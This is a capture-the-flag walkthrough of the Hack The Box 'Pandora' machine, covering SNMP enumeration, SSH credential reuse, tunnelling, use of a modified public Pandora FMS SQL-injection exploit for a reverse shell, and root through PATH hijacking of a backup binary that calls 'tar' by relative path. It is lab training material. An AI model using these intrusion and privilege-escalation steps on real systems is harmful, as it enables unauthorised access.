# Pandora Write-Up - HTB

Target\_IP: 10.10.11.136

## ENUMERATION🕵:

Starting enumeration by a standars -sS scan:

```bash
nmap -sS -Pn -n --disable-arp-ping -oA _sS 10.10.11.136
```

```bash
# Nmap 7.94SVN scan initiated Tue Aug 27 19:27:11 2024 as: 
Nmap scan report for 10.10.11.136
Host is up (0.063s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
# Nmap done at Tue Aug 27 19:27:12 2024 -- 1 IP address (1 host up) scanned in 0.84 seconds
```

We can see port 22 and port 80 open.&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure></div>

&#x20;I went through the web app and couldn't find much useful. I then tried to do some vhost and sub-directory brute-forcing, but nothing :(:

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

I then scanned most common 100 UDP ports.

```bash
nmap -sU --top-ports=100 -Pn -n --disable-arp-ping -oA udp_100 10.10.11.136
```

```bash
# Nmap 7.94SVN scan initiated Tue Aug 27 19:28:08 2024 as: 
Nmap scan report for 10.10.11.136
Host is up (0.081s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

# Nmap done at Tue Aug 27 19:29:52 2024 -- 1 IP address (1 host up) scanned in 103.35 seconds
```

161, SNMP open. Let's enumerate it and see what we get. First, let's check what community strings are available to us:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.136
```

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

The public one is up! Let's see !

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

I found snmpwalk going through all OIDs being messy and taking some time, so I tailored my command to check OIDs individually and I found `1.3.6.1.2.1.25.4` to have a treasure:&#x20;

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

## &#x20;FOOTHOLDING💀:

I then ran these credentials on ssh:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure></div>

&#x20;Let's check SUDO:&#x20;

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

&#x20;We are not allowed to :( Hmm, trying to check for perm files:&#x20;

<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

&#x20;I see now that there is lateral movement involved in this machine prior to getting root. I then started to enumerate the machine and found something interesting in `www`:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure></div>

&#x20;Hmm so this pandora folder is owned by matt. Let's check for internal ports `ss -tlpn` to see what's going on here:

<figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

## LATERAL MOVEMENT💀:

So, in order to access this resource, let's set up the ssh tunel:

```bash
ssh -f -N -L 80:127.0.0.1:80 -L 80:127.0.0.1:80 daniel@10.10.11.136
```

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Navitage to 127.0.0.1:80 in browser:&#x20;

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure></div>

So I googled for this version's available PoCs and found [this](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py) I tailored the script to my needs, instead of the "test" I made it run a reverse shell directly.&#x20;

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

&#x20;In the meantime I did setup a listener:&#x20;

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

&#x20;AND BOOOM! We got it :) Upgrade the shell now:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

&#x20;Now remember from our initial enum that there is the backup\_pandora interesting file, let's check it now that we got matt. By running `cat` on it, we can see:&#x20;

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

```bash
clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```

## PRIV ESC☠️:

So it is not using an absolute path! Let's try and get root via this. So I did:

```bash
export PATH=/home/matt:$PATH
echo "/bin/sh" > tar
chmod +x tar
```

<div align="left"><figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure></div>

&#x20;For some reason I kept getting matt, so I started searching for something else. First I did stabilize my shell.

```bash
cd /home/matt
mkdir .ssh
cd .ssh
ssh-keygen -t rsa -b 4096

Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Il1dP7Qfs4s2ALlsrhRFvEo1pCODXMrZnOytNa5LqjY matt@pandora
The key's randomart image is:
+---[RSA 4096]----+
|     .  oo  . .  |
|  o O . o=.. o . |
|   * B oo++   +o |
|    ..+o+.o    o+|
|    ..+=S+ .   ..|
|     .+o=   . . .|
|     o o .   + . |
| E  o o .   . .  |
|..o. o..         |
+----[SHA256]-----+

```

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

&#x20;Setting up a web server so I can transfer it on my host.&#x20;

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Trying to ssh with the key:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure></div>

Creating the authorized\_keys so that we can do it:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure></div>

&#x20;Now again:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure></div>

&#x20;Great, we got a stable shell. I did try to enumerate everything again, but nothing. Really the intended path to be this one with the pandora\_backup, so I try it again. So:&#x20;

<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Running the binary again:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure></div>

&#x20;Hmm, this time we have root. Literally this machine made me xplode cuz I was not understanding why this pandora\_backup is not giving me root. I will research this.

&#x20;Anyways, I stabilized the shell for root too to check the machine in-depth and see what happened, cheers!&#x20;

